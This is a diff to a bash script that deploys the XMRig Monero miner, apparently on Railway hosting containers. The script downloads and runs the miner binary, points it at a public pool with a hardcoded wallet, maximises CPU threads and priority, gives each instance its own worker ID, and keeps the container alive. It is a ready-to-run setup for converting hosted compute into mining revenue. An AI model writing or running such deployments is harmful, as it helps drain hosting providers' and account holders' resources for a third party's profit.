@@ -1,19 +1,44 @@
 #!/usr/bin/env bash
-set -e
+set -euo pipefail  # Exit on any error, undefined vars, pipe failures
 
-# Install dependencies
-apt-get update
-apt-get install -y wget curl build-essential cmake libuv1-dev libssl-dev libhwloc-dev
+echo "🚀 Starting Railway XMRig Miner at $(date)"
+echo "Hostname: $(hostname)"
+echo "CPU Cores: $(nproc)"
 
-# Download xmrig
-wget -O xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz
+# Update and install dependencies (non-interactive)
+export DEBIAN_FRONTEND=noninteractive
+apt-get update -qq
+apt-get install -y --no-install-recommends \
+  wget curl build-essential cmake libuv1-dev libssl-dev libhwloc-dev \
+  procps htop
+
+# Download latest xmrig (use newest stable)
+XMRIG_URL="https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz"
+wget -q --show-progress -O xmrig.tar.gz "$XMRIG_URL"
 tar -xzf xmrig.tar.gz
-cd xmrig-6.18.1
+cd xmrig-6.21.0 || { echo "❌ xmrig directory not found"; exit 1; }
 
-# Start mining (runs until container stops)
-./xmrig \
+# Optimize CPU threads for Railway (use all cores - 2 for stability)
+CPU_THREADS=$(( $(nproc) - 2 ))
+echo "⚙️ Using $CPU_THREADS CPU threads"
+
+# Railway-specific worker ID (unique per instance)
+WORKER_ID="railway-$(hostname)-$(date +%s)"
+
+# Start mining with health monitoring
+echo "⛏️ Starting mining: $WORKER_ID"
+exec ./xmrig \
   -o pool.hashvault.pro:80 \
   -u 46Z3AbjEnaq9Aey2SCcHpe1MmZmYdKpL2TgFhHdn7LBmbfo327ChMYPKrbBccHYHr9Le93EXut6YBNh6RRfbFvuMH5Lt3jA \
-  -p railway-$(hostname) \
+  -p "$WORKER_ID" \
   --donate-level=1 \
-  --max-cpu-usage=90
+  --threads="$CPU_THREADS" \
+  --cpu-priority=2 \
+  --max-cpu-usage=95 \
+  --log-file=/tmp/xmrig.log \
+  --print-time=60 \
+  --background \
+  2>&1 | tee -a /tmp/miner.log
+
+# Keep container alive (fallback)
+tail -f /dev/null
